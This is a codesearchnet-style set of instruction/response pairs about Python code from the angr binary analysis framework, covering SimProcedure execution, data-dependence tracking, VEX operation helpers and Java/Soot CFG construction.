{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a 5 - tuple of strings sufficient for formatting with the procedure", "response": "def _describe_me(self):\n        \"\"\"\n        return a 5-tuple of strings sufficient for formatting with ``%s%s%s%s%s`` to verbosely describe the procedure\n        \"\"\"\n        return (\n            self.display_name,\n            ' (cont: %s)' % self.run_func if self.is_continuation else '',\n            ' (syscall)' if self.is_syscall else '',\n            ' (inline)' if not self.use_state_arguments else '',\n            ' (stub)' if self.is_stub else '',\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef execute(self, state, successors=None, arguments=None, ret_to=None):\n        # fill out all the fun stuff we don't want to frontload\n        if self.addr is None and not state.regs.ip.symbolic:\n            self.addr = state.addr\n        if self.arch is None:\n            self.arch = state.arch\n        if self.project is None:\n            self.project = state.project\n        if self.cc is None:\n            if self.arch.name in DEFAULT_CC:\n                self.cc = DEFAULT_CC[self.arch.name](self.arch)\n            else:\n                raise SimProcedureError('There is no default calling convention for architecture %s.'\n                                        ' You must specify a calling convention.' % self.arch.name)\n\n        inst = copy.copy(self)\n        inst.state = state\n        inst.successors = successors\n        inst.ret_to = ret_to\n        inst.inhibit_autoret = False\n\n        # check to see if this is a syscall and if we should override its return value\n        override = None\n        if inst.is_syscall:\n            state.history.recent_syscall_count = 1\n            if len(state.posix.queued_syscall_returns):\n                override = state.posix.queued_syscall_returns.pop(0)\n\n        if callable(override):\n            try:\n                r = override(state, run=inst)\n            except TypeError:\n                r = override(state)\n            inst.use_state_arguments = True\n\n        elif override is not None:\n            r = override\n            inst.use_state_arguments = True\n\n        else:\n            # get the arguments\n\n            # If the simprocedure is related to a Java function call the appropriate setup_args methos\n            # TODO: should we move this?\n            if self.is_java:\n                sim_args = self._setup_args(inst, state, arguments)\n                self.use_state_arguments = False\n\n            # handle if this is a continuation from a return\n            elif inst.is_continuation:\n                if state.callstack.top.procedure_data is None:\n                    raise SimProcedureError(\"Tried to return to a SimProcedure in an inapplicable stack frame!\")\n\n                saved_sp, sim_args, saved_local_vars, saved_lr = state.callstack.top.procedure_data\n                state.regs.sp = saved_sp\n                if saved_lr is not None:\n                    state.regs.lr = saved_lr\n                inst.arguments = sim_args\n                inst.use_state_arguments = True\n                inst.call_ret_expr = state.registers.load(state.arch.ret_offset, state.arch.bytes, endness=state.arch.register_endness)\n                for name, val in saved_local_vars:\n                    setattr(inst, name, val)\n            else:\n                if arguments is None:\n                    inst.use_state_arguments = True\n                    sim_args = [ inst.arg(_) for _ in range(inst.num_args) ]\n                    inst.arguments = sim_args\n                else:\n                    inst.use_state_arguments = False\n                    sim_args = arguments[:inst.num_args]\n                    inst.arguments = arguments\n\n            # run it\n            l.debug(\"Executing %s%s%s%s%s with %s, %s\", *(inst._describe_me() + (sim_args, inst.kwargs)))\n            r = getattr(inst, inst.run_func)(*sim_args, **inst.kwargs)\n\n        if inst.returns and inst.is_function and not inst.inhibit_autoret:\n            inst.ret(r)\n\n        return inst", "response": "Call this method with a SimState and a SimSuccessors to execute the procedure.\n\n        Alternately, successors may be none if this is an inline call. In that case, you should\n        provide arguments to the function."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the ith argument. Raise a SimProcedureArgumentError if we don t have such an argument available.", "response": "def arg(self, i):\n        \"\"\"\n        Returns the ith argument. Raise a SimProcedureArgumentError if we don't have such an argument available.\n\n        :param int i: The index of the argument to get\n        :return: The argument\n        :rtype: object\n        \"\"\"\n        if self.use_state_arguments:\n            r = self.cc.arg(self.state, i)\n        else:\n            if i >= len(self.arguments):\n                raise SimProcedureArgumentError(\"Argument %d does not exist.\" % i)\n            r = self.arguments[i]           # pylint: disable=unsubscriptable-object\n\n        l.debug(\"returning argument\")\n        return r"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef inline_call(self, procedure, *arguments, **kwargs):\n        e_args = [ self.state.solver.BVV(a, self.state.arch.bits) if isinstance(a, int) else a for a in arguments ]\n        p = procedure(project=self.project, **kwargs)\n        return p.execute(self.state, None, arguments=e_args)", "response": "In - line call another SimProcedure in - line to retrieve its return value."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nadds an exit representing a return from this function.", "response": "def ret(self, expr=None):\n        \"\"\"\n        Add an exit representing a return from this function.\n        If this is not an inline call, grab a return address from the state and jump to it.\n        If this is not an inline call, set a return expression with the calling convention.\n        \"\"\"\n        self.inhibit_autoret = True\n\n        if expr is not None:\n            if o.SIMPLIFY_RETS in self.state.options:\n                l.debug(\"... simplifying\")\n                l.debug(\"... before: %s\", expr)\n                expr = self.state.solver.simplify(expr)\n                l.debug(\"... after: %s\", expr)\n\n            if self.symbolic_return:\n                size = len(expr)\n                new_expr = self.state.solver.Unconstrained(\n                        \"symbolic_return_\" + self.display_name,\n                        size,\n                        key=('symbolic_return', self.display_name)) #pylint:disable=maybe-no-member\n                self.state.add_constraints(new_expr == expr)\n                expr = new_expr\n\n            self.ret_expr = expr\n\n        ret_addr = None\n        # TODO: I had to put this check here because I don't understand why self.use_state_arguments gets reset to true\n        # when calling the function ret. at the calling point the attribute is set to False\n        if isinstance(self.addr, SootAddressDescriptor):\n            ret_addr = self._compute_ret_addr(expr)\n        elif self.use_state_arguments:\n            ret_addr = self.cc.teardown_callsite(\n                    self.state,\n                    expr,\n                    arg_types=[False]*self.num_args if self.cc.args is None else None)\n\n        if not self.should_add_successors:\n            l.debug(\"Returning without setting exits due to 'internal' call.\")\n            return\n\n        if self.ret_to is not None:\n            ret_addr = self.ret_to\n\n        if ret_addr is None:\n            raise SimProcedureError(\"No source for return address in ret() call!\")\n\n        self._prepare_ret_state()\n\n        self._exit_action(self.state, ret_addr)\n        self.successors.add_successor(self.state, ret_addr, self.state.solver.true, 'Ijk_Ret')"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds an exit representing calling another function via pointer.", "response": "def call(self, addr, args, continue_at, cc=None):\n        \"\"\"\n        Add an exit representing calling another function via pointer.\n\n        :param addr:        The address of the function to call\n        :param args:        The list of arguments to call the function with\n        :param continue_at: Later, when the called function returns, execution of the current\n                            procedure will continue in the named method.\n        :param cc:          Optional: use this calling convention for calling the new function.\n                            Default is to use the current convention.\n        \"\"\"\n        self.inhibit_autoret = True\n\n        if cc is None:\n            cc = self.cc\n\n        call_state = self.state.copy()\n        ret_addr = self.make_continuation(continue_at)\n        saved_local_vars = list(zip(self.local_vars, map(lambda name: getattr(self, name), self.local_vars)))\n        simcallstack_entry = (self.state.regs.sp if hasattr(self.state.regs, \"sp\") else None,\n                              self.arguments,\n                              saved_local_vars,\n                              self.state.regs.lr if self.state.arch.lr_offset is not None else None)\n        cc.setup_callsite(call_state, ret_addr, args)\n        call_state.callstack.top.procedure_data = simcallstack_entry\n\n        # TODO: Move this to setup_callsite?\n        if isinstance(call_state.addr, SootAddressDescriptor):\n            pass\n        elif call_state.libc.ppc64_abiv == 'ppc64_1':\n            call_state.regs.r2 = self.state.mem[addr + 8:].long.resolved\n            addr = call_state.mem[addr:].long.resolved\n        elif call_state.arch.name in ('MIPS32', 'MIPS64'):\n            call_state.regs.t9 = addr\n\n        self._exit_action(call_state, addr)\n        self.successors.add_successor(call_state, addr, call_state.solver.true, 'Ijk_Call')\n\n        if o.DO_RET_EMULATION in self.state.options:\n            # we need to set up the call because the continuation will try to tear it down\n            ret_state = self.state.copy()\n            cc.setup_callsite(ret_state, ret_addr, args)\n            ret_state.callstack.top.procedure_data = simcallstack_entry\n            guard = ret_state.solver.true if o.TRUE_RET_EMULATION_GUARD in ret_state.options else ret_state.solver.false\n            self.successors.add_successor(ret_state, ret_addr, guard, 'Ijk_FakeRet')"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef jump(self, addr):\n        self.inhibit_autoret = True\n        self._exit_action(self.state, addr)\n        self.successors.add_successor(self.state, addr, self.state.solver.true, 'Ijk_Boring')", "response": "Add an exit representing jumping to an address."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef exit(self, exit_code):\n        self.inhibit_autoret = True\n        self.state.options.discard(o.AST_DEPS)\n        self.state.options.discard(o.AUTO_REFS)\n\n        if isinstance(exit_code, int):\n            exit_code = self.state.solver.BVV(exit_code, self.state.arch.bits)\n        self.state.history.add_event('terminate', exit_code=exit_code)\n        self.successors.add_successor(self.state, self.state.regs.ip, self.state.solver.true, 'Ijk_Exit')", "response": "Add an exit representing terminating the program."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _explore(self):\n\n        # TODO: The worklist algorithm can definitely use some optimizations. It is a future work.\n\n        # The worklist holds individual VFGNodes that comes from the VFG\n        # Initialize the worklist with all nodes in VFG\n        worklist = list(self._vfg.graph.nodes())\n        # Set up a set of worklist for fast inclusion test\n        worklist_set = set(worklist)\n\n        # A dict storing defs set\n        # variable -> locations\n        live_defs_per_node = { }\n\n        while worklist:\n            # Pop out a node\n            node = worklist[0]\n            worklist_set.remove(node)\n            worklist = worklist[ 1 : ]\n\n            # Grab all final states. There are usually more than one (one state for each successor), and we gotta\n            # process all of them\n            final_states = node.final_states\n\n            if node in live_defs_per_node:\n                live_defs = live_defs_per_node[node]\n            else:\n                live_defs = { }\n                live_defs_per_node[node] = live_defs\n\n            successing_nodes = self._vfg.graph.successors(node)\n            for state in final_states:\n                if state.history.jumpkind == 'Ijk_FakeRet' and len(final_states) > 1:\n                    # Skip fakerets if there are other control flow transitions available\n                    continue\n\n                # TODO: Match the jumpkind\n                # TODO: Support cases where IP is undecidable\n                corresponding_successors = [ n for n in successing_nodes if n.addr == state.solver.eval(state.ip) ]\n                if not corresponding_successors:\n                    continue\n                successing_node = corresponding_successors[0]\n\n                new_defs = self._track(state, live_defs)\n\n                if successing_node in live_defs_per_node:\n                    defs_for_next_node = live_defs_per_node[successing_node]\n                else:\n                    defs_for_next_node = { }\n                    live_defs_per_node[successing_node] = defs_for_next_node\n\n                changed = False\n                for var, code_loc_set in new_defs.items():\n                    if var not in defs_for_next_node:\n                        defs_for_next_node[var] = code_loc_set\n                        changed = True\n\n                    else:\n                        for code_loc in code_loc_set:\n                            if code_loc not in defs_for_next_node[var]:\n                                defs_for_next_node[var].add(code_loc)\n                                changed = True\n\n                if changed:\n                    # Put all reachable successors back to our worklist again\n                    if successing_node not in worklist_set:\n                        worklist.append(successing_node)\n                        worklist_set.add(successing_node)\n                    all_successors_dict = networkx.dfs_successors(self._vfg.graph, source=successing_node)\n                    for successors in all_successors_dict.values():\n                        for s in successors:\n                            if s not in worklist_set:\n                                worklist.append(s)\n                                worklist_set.add(s)", "response": "Explore the entire VFG and generate def - use chains for all registers and memory addresses using a worklist."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngive all live definitions prior to this program point, track the changes, and return a new list of live definitions. We scan through the action list of the new state to track the changes. :param state: The input state at that program point. :param live_defs: A list of all live definitions prior to reaching this program point. :returns: A list of new live definitions.", "response": "def _track(self, state, live_defs):\n        \"\"\"\n        Given all live definitions prior to this program point, track the changes, and return a new list of live\n        definitions. We scan through the action list of the new state to track the changes.\n\n        :param state:       The input state at that program point.\n        :param live_defs:   A list of all live definitions prior to reaching this program point.\n        :returns:           A list of new live definitions.\n        \"\"\"\n\n        # Make a copy of live_defs\n        live_defs = live_defs.copy()\n\n        action_list = list(state.history.recent_actions)\n\n        # Since all temporary variables are local, we simply track them in a local dict\n        temps = { }\n\n        # All dependence edges are added to the graph either at the end of this method, or when they are going to be\n        # overwritten by a new edge. This is because we sometimes have to modify a  previous edge (e.g. add new labels\n        # to the edge)\n        temps_to_edges = defaultdict(list)\n        regs_to_edges = defaultdict(list)\n\n        def _annotate_edges_in_dict(dict_, key, **new_labels):\n            \"\"\"\n\n            :param dict_:       The dict, can be either `temps_to_edges` or `regs_to_edges`\n            :param key:         The key used in finding elements in the dict\n            :param new_labels:  New labels to be added to those edges\n            \"\"\"\n\n            for edge_tuple in dict_[key]:\n                # unpack it\n                _, _, labels = edge_tuple\n                for k, v in new_labels.items():\n                    if k in labels:\n                        labels[k] = labels[k] + (v, )\n                    else:\n                        # Construct a tuple\n                        labels[k] = (v, )\n\n        def _dump_edge_from_dict(dict_, key, del_key=True):\n            \"\"\"\n            Pick an edge from the dict based on the key specified, add it to our graph, and remove the key from dict.\n\n            :param dict_:   The dict, can be either `temps_to_edges` or `regs_to_edges`.\n            :param key:     The key used in finding elements in the dict.\n            \"\"\"\n            for edge_tuple in dict_[key]:\n                # unpack it\n                prev_code_loc, current_code_loc, labels = edge_tuple\n                # Add the new edge\n                self._add_edge(prev_code_loc, current_code_loc, **labels)\n\n            # Clear it\n            if del_key:\n                del dict_[key]\n\n        for a in action_list:\n\n            if a.bbl_addr is None:\n                current_code_loc = CodeLocation(None, None, sim_procedure=a.sim_procedure)\n            else:\n                current_code_loc = CodeLocation(a.bbl_addr, a.stmt_idx, ins_addr=a.ins_addr)\n\n            if a.type == \"mem\":\n                if a.actual_addrs is None:\n                    # For now, mem reads don't necessarily have actual_addrs set properly\n                    addr_list = set(state.memory.normalize_address(a.addr.ast, convert_to_valueset=True))\n                else:\n                    addr_list = set(a.actual_addrs)\n\n                for addr in addr_list:\n                    variable = SimMemoryVariable(addr, a.data.ast.size()) # TODO: Properly unpack the SAO\n\n                    if a.action == \"read\":\n                        # Create an edge between def site and use site\n\n                        prevdefs = self._def_lookup(live_defs, variable)\n\n                        for prev_code_loc, labels in prevdefs.items():\n                            self._read_edge = True\n                            self._add_edge(prev_code_loc, current_code_loc, **labels)\n\n                    else: #if a.action == \"write\":\n                        # Kill the existing live def\n                        self._kill(live_defs, variable, current_code_loc)\n\n                    # For each of its register dependency and data dependency, we revise the corresponding edge\n                    for reg_off in a.addr.reg_deps:\n                        _annotate_edges_in_dict(regs_to_edges, reg_off, subtype='mem_addr')\n                    for tmp in a.addr.tmp_deps:\n                        _annotate_edges_in_dict(temps_to_edges, tmp, subtype='mem_addr')\n\n                    for reg_off in a.data.reg_deps:\n                        _annotate_edges_in_dict(regs_to_edges, reg_off, subtype='mem_data')\n                    for tmp in a.data.tmp_deps:\n                        _annotate_edges_in_dict(temps_to_edges, tmp, subtype='mem_data')\n\n            elif a.type == 'reg':\n                # For now, we assume a.offset is not symbolic\n                # TODO: Support symbolic register offsets\n\n                #variable = SimRegisterVariable(a.offset, a.data.ast.size())\n                variable = SimRegisterVariable(a.offset, self.project.arch.bits)\n\n                if a.action == 'read':\n                    # What do we want to do?\n                    prevdefs = self._def_lookup(live_defs, variable)\n\n                    if a.offset in regs_to_edges:\n                        _dump_edge_from_dict(regs_to_edges, a.offset)\n\n                    for prev_code_loc, labels in prevdefs.items():\n                        edge_tuple = (prev_code_loc, current_code_loc, labels)\n                        regs_to_edges[a.offset].append(edge_tuple)\n\n                else:\n                    # write\n                    self._kill(live_defs, variable, current_code_loc)\n\n            elif a.type == 'tmp':\n                # tmp is definitely not symbolic\n                if a.action == 'read':\n                    prev_code_loc = temps[a.tmp]\n                    edge_tuple = (prev_code_loc, current_code_loc, {'type':'tmp', 'data':a.tmp})\n\n                    if a.tmp in temps_to_edges:\n                        _dump_edge_from_dict(temps_to_edges, a.tmp)\n\n                    temps_to_edges[a.tmp].append(edge_tuple)\n\n                else:\n                    # write\n                    temps[a.tmp] = current_code_loc\n\n            elif a.type == 'exit':\n                # exits should only depend on tmps\n\n                for tmp in a.tmp_deps:\n                    prev_code_loc = temps[tmp]\n                    edge_tuple = (prev_code_loc, current_code_loc, {'type': 'exit', 'data': tmp})\n\n                    if tmp in temps_to_edges:\n                        _dump_edge_from_dict(temps_to_edges, tmp)\n\n                    temps_to_edges[tmp].append(edge_tuple)\n\n        # In the end, dump all other edges in those two dicts\n        for reg_offset in regs_to_edges:\n            _dump_edge_from_dict(regs_to_edges, reg_offset, del_key=False)\n        for tmp in temps_to_edges:\n            _dump_edge_from_dict(temps_to_edges, tmp, del_key=False)\n\n        return live_defs"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _def_lookup(self, live_defs, variable):\n\n        prevdefs = { }\n\n        if variable in live_defs:\n            code_loc_set = live_defs[variable]\n            for code_loc in code_loc_set:\n                # Label edges with cardinality or actual sets of addresses\n                if isinstance(variable, SimMemoryVariable):\n                    type_ = 'mem'\n                elif isinstance(variable, SimRegisterVariable):\n                    type_ = 'reg'\n                else:\n                    raise AngrDDGError('Unknown variable type %s' % type(variable))\n\n                if self.keep_data is True:\n                    data = variable\n\n                    prevdefs[code_loc] = {\n                        'type': type_,\n                        'data': data\n                    }\n\n                else:\n                    if code_loc in prevdefs:\n                        count = prevdefs[code_loc]['count'] + 1\n                    else:\n                        count = 0\n                    prevdefs[code_loc] = {\n                        'type': type_,\n                        'count': count\n                    }\n        return prevdefs", "response": "This is a backward lookup in the previous defs."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _kill(self, live_defs, variable, code_loc):\n\n        # Case 1: address perfectly match, we kill\n        # Case 2: a is a subset of the original address\n        # Case 3: a is a superset of the original address\n\n        live_defs[variable] = { code_loc }\n        l.debug(\"XX CodeLoc %s kills variable %s\", code_loc, variable)", "response": "Kill previous defs. `addr_list` is a list of normalized addresses."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd an edge from s_a to s_b.", "response": "def _add_edge(self, s_a, s_b, **edge_labels):\n        \"\"\"\n        Add an edge in the graph from `s_a` to statement `s_b`, where `s_a` and `s_b` are tuples of statements of the\n        form (irsb_addr, stmt_idx).\n        \"\"\"\n        # Is that edge already in the graph ?\n        # If at least one is new, then we are not redoing the same path again\n        if (s_a, s_b) not in self.graph.edges():\n            self.graph.add_edge(s_a, s_b, **edge_labels)\n            self._new = True\n            l.info(\"New edge: %s --> %s\", s_a, s_b)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget all nodes matching the given basic block address and statement index.", "response": "def get_all_nodes(self, simrun_addr, stmt_idx):\n        \"\"\"\n        Get all DDG nodes matching the given basic block address and statement index.\n        \"\"\"\n        nodes=[]\n        for n in self.graph.nodes():\n            if n.simrun_addr == simrun_addr and n.stmt_idx == stmt_idx:\n                nodes.add(n)\n        return nodes"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef vector_args(self, args):\n        for i in reversed(range(self._vector_count)):\n            pieces = []\n            for vec in args:\n                pieces.append(vec[(i+1) * self._vector_size - 1 : i * self._vector_size])\n            yield pieces", "response": "Yields each individual lane pair from the arguments in the order from most significan to least significant\n           "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncounting the leading zeroes", "response": "def _op_generic_Clz(self, args):\n        \"\"\"Count the leading zeroes\"\"\"\n        wtf_expr = claripy.BVV(self._from_size, self._from_size)\n        for a in range(self._from_size):\n            bit = claripy.Extract(a, a, args[0])\n            wtf_expr = claripy.If(bit==1, claripy.BVV(self._from_size-a-1, self._from_size), wtf_expr)\n        return wtf_expr"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _op_generic_Ctz(self, args):\n        wtf_expr = claripy.BVV(self._from_size, self._from_size)\n        for a in reversed(range(self._from_size)):\n            bit = claripy.Extract(a, a, args[0])\n            wtf_expr = claripy.If(bit == 1, claripy.BVV(a, self._from_size), wtf_expr)\n        return wtf_expr", "response": "Count the trailing zeroes in the ctz table"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _op_generic_HAdd(self, args):\n        components = []\n        for a, b in self.vector_args(args):\n            if self.is_signed:\n                a = a.sign_extend(self._vector_size)\n                b = b.sign_extend(self._vector_size)\n            else:\n                a = a.zero_extend(self._vector_size)\n                b = b.zero_extend(self._vector_size)\n            components.append((a + b)[self._vector_size:1])\n        return claripy.Concat(*components)", "response": "Halving add for some ARM NEON instructions."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn unsigned saturated BV from signed BV.", "response": "def _op_generic_StoU_saturation(self, value, min_value, max_value): #pylint:disable=no-self-use\n        \"\"\"\n        Return unsigned saturated BV from signed BV.\n        Min and max value should be unsigned.\n        \"\"\"\n        return claripy.If(\n            claripy.SGT(value, max_value),\n            max_value,\n            claripy.If(claripy.SLT(value, min_value), min_value, value))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _scan_block(self, cfg_job):\n\n        addr = cfg_job.addr\n        current_func_addr = cfg_job.func_addr\n\n        if self._addr_hooked_or_syscall(addr):\n            entries = self._scan_procedure(cfg_job, current_func_addr)\n\n        else:\n            entries = self._scan_soot_block(cfg_job, current_func_addr)\n\n        return entries", "response": "Scan a basic block starting at a specific address."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nscanning the Soot block for successors and create a list of entries.", "response": "def _scan_soot_block(self, cfg_job, current_func_addr):\n        \"\"\"\n        Generate a list of successors (generating them each as entries) to IRSB.\n        Updates previous CFG nodes with edges.\n\n        :param CFGJob cfg_job: The CFGJob instance.\n        :param int current_func_addr: Address of the current function\n        :return: a list of successors\n        :rtype: list\n        \"\"\"\n\n        addr, function_addr, cfg_node, soot_block = self._generate_cfgnode(cfg_job, current_func_addr)\n\n        # Add edges going to this node in function graphs\n        cfg_job.apply_function_edges(self, clear=True)\n\n        # function_addr and current_function_addr can be different. e.g. when tracing an optimized tail-call that jumps\n        # into another function that has been identified before.\n\n        if cfg_node is None:\n            # exceptions occurred, or we cannot get a CFGNode for other reasons\n            return [ ]\n\n        self._graph_add_edge(cfg_node, cfg_job.src_node, cfg_job.jumpkind, cfg_job.src_ins_addr,\n                             cfg_job.src_stmt_idx\n                             )\n        self._function_add_node(cfg_node, function_addr)\n\n        # If we have traced it before, don't trace it anymore\n        if addr in self._traced_addresses:\n            # the address has been traced before\n            return [ ]\n        else:\n            # Mark the address as traced\n            self._traced_addresses.add(addr)\n\n        # soot_block is only used once per CFGNode. We should be able to clean up the CFGNode here in order to save memory\n        cfg_node.soot_block = None\n\n        successors = self._soot_get_successors(addr, current_func_addr, soot_block, cfg_node)\n\n        entries = [ ]\n\n        for suc in successors:\n            stmt_idx, stmt_addr, target, jumpkind = suc\n\n            entries += self._create_jobs(target, jumpkind, function_addr, soot_block, addr, cfg_node, stmt_addr,\n                                         stmt_idx\n                                         )\n\n        return entries"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a list of CFGJobs that are needed to perform a function call or exit.", "response": "def _create_jobs(self, target, jumpkind, current_function_addr, soot_block, addr, cfg_node, stmt_addr, stmt_idx):  # pylint:disable=arguments-differ\n\n        \"\"\"\n        Given a node and details of a successor, makes a list of CFGJobs\n        and if it is a call or exit marks it appropriately so in the CFG\n\n        :param int target:          Destination of the resultant job\n        :param str jumpkind:        The jumpkind of the edge going to this node\n        :param int current_function_addr: Address of the current function\n        :param pyvex.IRSB irsb:     IRSB of the predecessor node\n        :param int addr:            The predecessor address\n        :param CFGNode cfg_node:    The CFGNode of the predecessor node\n        :param int ins_addr:        Address of the source instruction.\n        :param int stmt_addr:       ID of the source statement.\n        :return:                    a list of CFGJobs\n        :rtype:                     list\n        \"\"\"\n\n        target_addr = target\n\n        jobs = [ ]\n\n        if target_addr is None:\n            # The target address is not a concrete value\n\n            if jumpkind == \"Ijk_Ret\":\n                # This block ends with a return instruction.\n                if current_function_addr != -1:\n                    self._function_exits[current_function_addr].add(addr)\n                    self._function_add_return_site(addr, current_function_addr)\n                    self.functions[current_function_addr].returning = True\n                    self._pending_jobs.add_returning_function(current_function_addr)\n\n                cfg_node.has_return = True\n\n        elif target_addr is not None:\n            # This is a direct jump with a concrete target.\n\n            # pylint: disable=too-many-nested-blocks\n            if jumpkind in ('Ijk_Boring', 'Ijk_InvalICache'):\n                # it might be a jumpout\n                target_func_addr = None\n                if target_addr in self._traced_addresses:\n                    node = self.get_any_node(target_addr)\n                    if node is not None:\n                        target_func_addr = node.function_address\n                if target_func_addr is None:\n                    target_func_addr = current_function_addr\n\n                to_outside = not target_func_addr == current_function_addr\n\n                edge = FunctionTransitionEdge(cfg_node, target_addr, current_function_addr,\n                                              to_outside=to_outside,\n                                              dst_func_addr=target_func_addr,\n                                              ins_addr=stmt_addr,\n                                              stmt_idx=stmt_idx,\n                                              )\n\n                ce = CFGJob(target_addr, target_func_addr, jumpkind, last_addr=addr, src_node=cfg_node,\n                            src_ins_addr=stmt_addr, src_stmt_idx=stmt_idx, func_edges=[ edge ])\n                jobs.append(ce)\n\n            elif jumpkind == 'Ijk_Call' or jumpkind.startswith(\"Ijk_Sys\"):\n                jobs += self._create_job_call(addr, soot_block, cfg_node, stmt_idx, stmt_addr, current_function_addr,\n                                              target_addr, jumpkind, is_syscall=False\n                                              )\n                self._pending_jobs.add_returning_function(target.method)\n\n            else:\n                # TODO: Support more jumpkinds\n                l.debug(\"Unsupported jumpkind %s\", jumpkind)\n\n        return jobs"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nrevisit the entire control flow graph and create Function instances accordingly.", "response": "def make_functions(self):\n        \"\"\"\n        Revisit the entire control flow graph, create Function instances accordingly, and correctly put blocks into\n        each function.\n\n        Although Function objects are crated during the CFG recovery, they are neither sound nor accurate. With a\n        pre-constructed CFG, this method rebuilds all functions bearing the following rules:\n\n            - A block may only belong to one function.\n            - Small functions lying inside the startpoint and the endpoint of another function will be merged with the\n              other function\n            - Tail call optimizations are detected.\n            - PLT stubs are aligned by 16.\n\n        :return: None\n        \"\"\"\n\n        tmp_functions = self.kb.functions.copy()\n\n        for function in tmp_functions.values():\n            function.mark_nonreturning_calls_endpoints()\n\n        # Clear old functions dict\n        self.kb.functions.clear()\n\n        blockaddr_to_function = { }\n        traversed_cfg_nodes = set()\n\n        function_nodes = set()\n\n        # Find nodes for beginnings of all functions\n        for _, dst, data in self.graph.edges(data=True):\n            jumpkind = data.get('jumpkind', \"\")\n            if jumpkind == 'Ijk_Call' or jumpkind.startswith('Ijk_Sys'):\n                function_nodes.add(dst)\n\n        entry_node = self.get_any_node(self._binary.entry)\n        if entry_node is not None:\n            function_nodes.add(entry_node)\n\n        for n in self.graph.nodes():\n            funcloc = self._loc_to_funcloc(n.addr)\n            if funcloc in tmp_functions:\n                function_nodes.add(n)\n\n        # traverse the graph starting from each node, not following call edges\n        # it's important that we traverse all functions in order so that we have a greater chance to come across\n        # rational functions before its irrational counterparts (e.g. due to failed jump table resolution)\n\n        min_stage_2_progress = 50.0\n        max_stage_2_progress = 90.0\n        nodes_count = len(function_nodes)\n        for i, fn in enumerate(function_nodes):\n\n            if self._show_progressbar or self._progress_callback:\n                progress = min_stage_2_progress + (max_stage_2_progress - min_stage_2_progress) * (i * 1.0 / nodes_count)\n                self._update_progress(progress)\n\n            self._graph_bfs_custom(self.graph, [ fn ], self._graph_traversal_handler, blockaddr_to_function,\n                                   tmp_functions, traversed_cfg_nodes\n                                   )\n\n        # Don't forget those small function chunks that are not called by anything.\n        # There might be references to them from data, or simply references that we cannot find via static analysis\n\n        secondary_function_nodes = set()\n        # add all function chunks (\"functions\" that are not called from anywhere)\n        for func_addr in tmp_functions:\n            node = self.get_any_node(func_addr)\n            if node is None:\n                continue\n            if node.addr not in blockaddr_to_function:\n                secondary_function_nodes.add(node)\n\n        missing_cfg_nodes = set(self.graph.nodes()) - traversed_cfg_nodes\n        missing_cfg_nodes = { node for node in missing_cfg_nodes if node.function_address is not None }\n        if missing_cfg_nodes:\n            l.debug('%d CFGNodes are missing in the first traversal.', len(missing_cfg_nodes))\n            secondary_function_nodes |=  missing_cfg_nodes\n\n        min_stage_3_progress = 90.0\n        max_stage_3_progress = 99.9\n\n        nodes_count = len(secondary_function_nodes)\n        for i, fn in enumerate(secondary_function_nodes):\n\n            if self._show_progressbar or self._progress_callback:\n                progress = min_stage_3_progress + (max_stage_3_progress - min_stage_3_progress) * (i * 1.0 / nodes_count)\n                self._update_progress(progress)\n\n            self._graph_bfs_custom(self.graph, [fn], self._graph_traversal_handler, blockaddr_to_function,\n                                   tmp_functions\n                                   )\n\n        to_remove = set()\n\n        # remove empty functions\n        for function in self.kb.functions.values():\n            if function.startpoint is None:\n                to_remove.add(function.addr)\n\n        for addr in to_remove:\n            del self.kb.functions[addr]\n\n        # Update CFGNode.function_address\n        for node in self.model.nodes():\n            if node.addr in blockaddr_to_function:\n                node.function_address = blockaddr_to_function[node.addr].addr"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_field(self, state, field_name, field_type, value):\n        field_ref = SimSootValue_InstanceFieldRef.get_ref(state=state,\n                                                          obj_alloc_id=self.heap_alloc_id,\n                                                          field_class_name=self.type,\n                                                          field_name=field_name,\n                                                          field_type=field_type)\n        # store value in java memory\n        state.memory.store(field_ref, value)", "response": "Sets the value of the specified field in the state."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_field(self, state, field_name, field_type):\n        # get field reference\n        field_ref = SimSootValue_InstanceFieldRef.get_ref(state=state,\n                                                          obj_alloc_id=self.heap_alloc_id,\n                                                          field_class_name=self.type,\n                                                          field_name=field_name,\n                                                          field_type=field_type)\n        # load value from java memory\n        return state.memory.load(field_ref, none_if_missing=True)", "response": "Gets the value of an instance field."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef store_field(self, state, field_name, field_type, value):\n        field_ref = SimSootValue_InstanceFieldRef(self.heap_alloc_id, self.type, field_name, field_type)\n        state.memory.store(field_ref, value)", "response": "Store a field of a given object in the state s memory."}
